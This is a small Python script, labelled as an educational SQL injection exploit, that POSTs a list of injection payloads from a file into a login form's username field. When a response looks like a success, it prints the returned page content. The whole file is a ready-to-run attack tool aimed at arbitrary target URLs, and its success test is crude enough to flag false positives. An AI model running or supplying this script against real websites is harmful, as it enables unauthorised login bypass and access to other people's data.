#!/usr/bin/env python3
"""
SQL Injection Exploit (Educational Purposes Only)
Target: Vulnerable Login Form (POST-based)
Usage: python3 sql_injection_exploit.py <target_url> <param> <payload_file>
Example: python3 sql_injection_exploit.py http://vuln-site.com/login.php username payloads.txt
"""
import requests
from bs4 import BeautifulSoup
import sys

def exploit(target, param, payload_file):
    with open(payload_file, 'r') as f:
        payloads = f.readlines()

    for payload in payloads:
        payload = payload.strip()
        data = {param: payload, 'password': 'anything'}
        try:
            response = requests.post(target, data=data, timeout=5)
            if "error" not in response.text.lower() and response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                print(f"\n[+] Payload Success: {payload}")
                print("[+] Possible Vulnerable Page Content:")
                print("----------------------------------------")
                print(soup.get_text()[:500])  # Muestra primeras 500 chars
                break
        except Exception as e:
            print(f"[-] Error with payload {payload}: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print(f"Usage: {sys.argv[0]} <target_url> <param> <payload_file>")
        sys.exit(1)

    target = sys.argv[1]
    param = sys.argv[2]
    payload_file = sys.argv[3]
    exploit(target, param, payload_file)